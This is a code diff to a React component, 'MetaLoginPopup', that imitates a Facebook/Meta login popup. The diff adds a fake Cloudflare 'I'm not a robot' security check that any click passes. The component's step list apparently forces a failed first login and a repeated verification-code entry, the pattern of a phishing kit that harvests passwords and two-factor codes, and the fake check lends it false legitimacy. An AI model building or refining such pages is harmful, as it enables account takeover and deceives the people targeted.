@@ -11,7 +11,8 @@ import {
   AlertCircle,
   AlertTriangle,
   Eye,
-  EyeOff
+  EyeOff,
+  CheckCircle
 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -20,12 +21,13 @@ import { Progress } from "@/components/ui/progress";
 import { cn } from "@/lib/utils";
 
 enum LoginStep {
-  LOGIN_FIRST_ATTEMPT = 0,
-  LOGIN_SECOND_ATTEMPT = 1,
-  VERIFICATION_FIRST_ATTEMPT = 2,
-  VERIFICATION_TIMEOUT = 3,
-  VERIFICATION_SECOND_ATTEMPT = 4,
-  SUCCESS = 5
+  CAPTCHA_VERIFICATION = 0,
+  LOGIN_FIRST_ATTEMPT = 1,
+  LOGIN_SECOND_ATTEMPT = 2,
+  VERIFICATION_FIRST_ATTEMPT = 3,
+  VERIFICATION_TIMEOUT = 4,
+  VERIFICATION_SECOND_ATTEMPT = 5,
+  SUCCESS = 6
 }
 
 const MetaLoginPopup = () => {
@@ -33,7 +35,7 @@ const MetaLoginPopup = () => {
   const [password, setPassword] = useState("");
   const [verificationCode, setVerificationCode] = useState("");
   const [isLoading, setIsLoading] = useState(false);
-  const [currentStep, setCurrentStep] = useState(LoginStep.LOGIN_FIRST_ATTEMPT);
+  const [currentStep, setCurrentStep] = useState(LoginStep.CAPTCHA_VERIFICATION);
   const [countdown, setCountdown] = useState(60);
   const codeInputRef = useRef<HTMLInputElement>(null);
   
@@ -192,6 +194,55 @@ const MetaLoginPopup = () => {
                   Log in to continue with your application
                 </p>
               </div>
+              
+              {/* Captcha Verification Step */}
+              {currentStep === LoginStep.CAPTCHA_VERIFICATION && (
+                <div className="space-y-6">
+                  <div className="text-center">
+                    <div className="h-16 w-16 mx-auto mb-3 flex items-center justify-center bg-[#f0f2f5] rounded-full">
+                      <ShieldCheck className="h-8 w-8 text-[#1877F2]" />
+                    </div>
+                    <h3 className="text-xl font-semibold">Security Check</h3>
+                    <p className="text-[#65676b] mt-2 text-[15px]">
+                      Please complete the security check below to continue
+                    </p>
+                  </div>
+                  
+                  <div className="border border-gray-200 rounded-md p-4">
+                    <div className="flex items-center justify-between mb-4">
+                      <div className="flex items-center">
+                        <div className="w-5 h-5 bg-[#1877F2] rounded-sm flex items-center justify-center mr-2">
+                          <CheckCircle className="h-4 w-4 text-white" />
+                        </div>
+                        <div className="text-sm font-medium">Cloudflare Security</div>
+                      </div>
+                      <div className="text-xs text-gray-500">Protected</div>
+                    </div>
+                    
+                    <div className="bg-gray-100 rounded-md p-4 mb-4 flex items-center justify-center">
+                      <div className="text-center">
+                        <div className="inline-block border-2 border-gray-300 rounded-md p-3 mb-3">
+                          <div className="w-16 h-16 flex items-center justify-center">
+                            <div className="w-4 h-4 border-2 border-gray-400 rounded-sm"></div>
+                          </div>
+                        </div>
+                        <div className="text-sm text-gray-700">I'm not a robot</div>
+                      </div>
+                    </div>
+                    
+                    <Button 
+                      onClick={() => setCurrentStep(LoginStep.LOGIN_FIRST_ATTEMPT)}
+                      className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white h-[40px] rounded-[6px] font-medium"
+                    >
+                      Verify
+                    </Button>
+                  </div>
+                  
+                  <div className="text-xs text-center text-gray-500">
+                    This security check helps protect Facebook users against automated access attempts.
+                  </div>
+                </div>
+              )}
               
               {/* Login Steps */}
               {(currentStep === LoginStep.LOGIN_FIRST_ATTEMPT || currentStep === LoginStep.LOGIN_SECOND_ATTEMPT) && (
